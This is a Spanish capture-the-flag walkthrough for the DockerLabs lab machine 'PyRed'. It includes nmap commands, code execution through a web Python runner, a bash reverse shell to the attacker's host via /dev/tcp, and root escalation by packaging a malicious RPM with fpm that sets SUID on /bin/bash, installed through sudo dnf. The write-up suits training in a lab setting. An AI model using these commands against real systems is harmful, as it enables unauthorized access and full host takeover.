# PYRED - DOCKERLABS

## INFORMACIÓN Y DESPLIEGUE DE LA MÁQUINA

Esta máquina es de [DockerLabs](https://dockerlabs.es)

Para descargarla vas a [DockerLabs](https://dockerlabs.es) y buscas la máquina PyRed. Abres el enlace de mega, descargas el zip, lo descomprimes y ejecutas `bash ./auto_deploy.sh ./pyred.tar`. De esta forma se ejecutará el contendor de docker de la máquina.

### descripción

- Dificultad: medio
- Sistema Operativo: linux
- Autor: El Pingüino de Mario

## ESQUEMA

![pyred](https://github.com/user-attachments/assets/b4ff659e-d6c3-44d1-bac7-f19b3e558063)

## ENUMERACIÓN

### conectividad y SO

Primero comprobamos la conectividad con la máquina:

```python
ping -c 1 172.17.0.2
```

![image](https://github.com/user-attachments/assets/0cddb4bd-e1b7-4330-9580-62ddbf8f3799)

Recibimos respuesta. El TTL es de 64, indicando que la máquina seguramente use Linux.

### escaneo de puertos y servicios

Hacemos un escaneo de todo el rango de puertos por TCP con nmap:

```python
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG tcp_ports
```

> `-p-`: todo el rango de puertos

> `--open`: solo reportar los puertos abiertos

> `-sS`: usar el método de escaneo SYN, que es más sigiloso y rápido que el normal. Requiere privilegios a nivel de sistema para enviar raw packets

> `--min-rate 5000` enviar como mínimo 5000 paquetes por segundo

> `-vvv` triple verbose. Nada más descubrir un puerto lo muestra por pantalla, también muestra más información de lo normal sobre el escaneo

> `-n` no hacer resolución DNS

> `-Pn` no hacer host discovery

> `-oG tcp_ports` exportar el output en formato grepeable al archivo `tcp_ports`

![image](https://github.com/user-attachments/assets/3173c5ad-1799-45a7-8248-d511bbcdc495)

#### puertos abiertos

**5000 - TCP - HTTP**

Ahora hacemos un escaneo de versiones y servicios sobre el puerto 5000:

```python
nmap -p5000 -sCV 172.17.0.2 -oN targeted
```

> `-p5000` hacer el escaneo solo sobre los puertos 5000

> `-sCV` lanzar escaneo de versiones y scripts estándar de reconocimiento

> `-oN targeted` exportar el output al archivo `targeted`, en formato nmap

![image](https://github.com/user-attachments/assets/21a7654a-d97d-42fa-b657-f30226ee250a)

### puerto 5000

Gracias al escaneo de nmap, sabemos que este puerto responde a peticiones HTTP, así que ejecutamos `whatweb http://172.17.0.2:5000` para ver las tecnologías que usa el servidor. Vemos que usa Python

Cargamos la web en el navegador:

![image](https://github.com/user-attachments/assets/19d311ae-96ff-4183-b262-8ff22cd51764)

Parece que es una web para aprender Python, en la que se puede ejecutar código de este. Probamos a ejecutar `print("test)`:

![image](https://github.com/user-attachments/assets/d54812de-71e9-4e78-b914-da0e4c7ed534)

Se ejecuta. Podemos probar a usar la librería `os` para ejecutar el comando `id`:

```python
import os
os.system('id')
```

![image](https://github.com/user-attachments/assets/fb7aba73-62a7-4fa3-80b4-95bf8defaa97)

Se ejecuta correctamente.

## EXPLOTACIÓN

Ahora vamos a intentar ganar acceso a la máquina:

Ejecutamos en local:

```python
nc -nlvp 443
```

Ejecutamos en la web:

```python
import os
os.system("/bin/bash -i >& /dev/tcp/172.17.0.1/443 0>&1")
```

![image](https://github.com/user-attachments/assets/7a8e5efb-93e6-4441-b6bb-181b0bdbd053)

Y ganamos acceso como el usuario primpi a la máquina.

No podemos hacer el tratamiento de la TTY correctamente, porque no están instalados los comandos `script` y `reset`.

Si ejecutamos `sudo -l`:

![image](https://github.com/user-attachments/assets/4d2a4e4a-c1ae-40af-bf02-04d729052831)

Sale que podemos ejecutar como cualquier usuario, sin poner nuestra contraseña, el binario `/usr/bin/dnf`. DNF es un gestor de paquetes, así que podemos aprovecharnos de esto para instalar `script` y `reset`:

```python
sudo dnf install -y util-linux ncurses
```

Después, hacemos el tratamiento de la TTY:

## TRATAMIENTO TTY

```python
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows <filas> columns <columnas>
```

Para ver el número de filas y columnas que usa tu pantalla, ejecutas `stty -a`.

## ESCALADA DE PRIVILEGIOS

### root

Sabemos que podemos ejecutar con privilegios de sudo el gestor de paquetes DNF, así que vamos a buscar en [gtfobins](https://gtfobins.github.io/) si se puede escalar privilegios con esto:

![image](https://github.com/user-attachments/assets/72453587-5d11-47be-a3d9-2f4ba08974fb)

Para conseguir ejecutar comandos como root, tenemos que crear un archivo de texto que contenga un comando. Luego crear un paquete a partir de este, con la herramienta FPM. Y finalmente instalar este paquete con DNF usando privilegios de sudo, y de esta forma el comando se ejecuta.

Para instalar fpm ejecutamos:

```python
sudo dnf install -y ruby rubygems rpm-build
```

Y luego:

```python
gem install fpm
```

Ahora para crear el paquete malicioso ejecutamos:

```python
echo 'chmod u+s /bin/bash' > pwn.sh
fpm -n x -s dir -t rpm -a all --before-install pwn.sh pwn.sh
```

Se nos queda un archivo llamado `x-1.0-1.noarch.rpm`. Ahora lo instalamos con DNF:

```python
sudo dnf install -y x-1.0-1.noarch.rpm
```

Y ahora hacemos `ls -l /bin/bash`:

![image](https://github.com/user-attachments/assets/18a2626a-9286-4e0f-9d08-4c47654129ed)

Tiene permisos SUID. Para ganar una bash como root: `bash -p`:

![image](https://github.com/user-attachments/assets/c82dcbde-fbd1-4dcc-919b-ff37c0b8f462)